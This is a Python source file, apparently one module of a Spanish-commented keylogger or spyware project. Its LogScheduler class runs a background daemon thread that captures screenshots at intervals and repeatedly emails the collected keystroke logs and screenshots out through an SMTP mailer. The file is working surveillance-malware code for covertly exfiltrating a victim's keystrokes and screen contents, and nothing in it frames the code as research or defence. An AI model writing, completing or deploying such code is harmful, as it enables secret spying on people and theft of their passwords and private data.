import time
from threading import Thread
from .mailSender import MailSender
from .keylogger import KeyLogger
from .screenshot import ScreenshotCapturer
from .SMTP_config import SMTP_CONFIG 

class LogScheduler:
    def __init__(self):
        self.mailer = MailSender()
        self.screenshotter = ScreenshotCapturer()
        self.is_running = False
        
    def _send_loop(self):
        while self.is_running:
            try:
                if time.time() - self.screenshotter.last_capture_time >= SMTP_CONFIG['screenshot_interval']:
                    self.screenshotter.capture()
                
                # 2. Enviar logs y screenshots
                self.mailer.send_log_with_screenshots()
                
                # 3. Esperar el intervalo configurado
                time.sleep(SMTP_CONFIG['screenshot_interval'])
                
            except Exception as e:
                print(f"[ERROR] En scheduler: {str(e)}")
                time.sleep(5) 
            
    def start(self):
        if not self.is_running:
            self.is_running = True
            worker = Thread(target=self._send_loop, daemon=True)
            worker.start()
            print(f"[+] Scheduler iniciado")
            
    def stop(self):
        self.is_running = False
        print("[-] Scheduler detenido")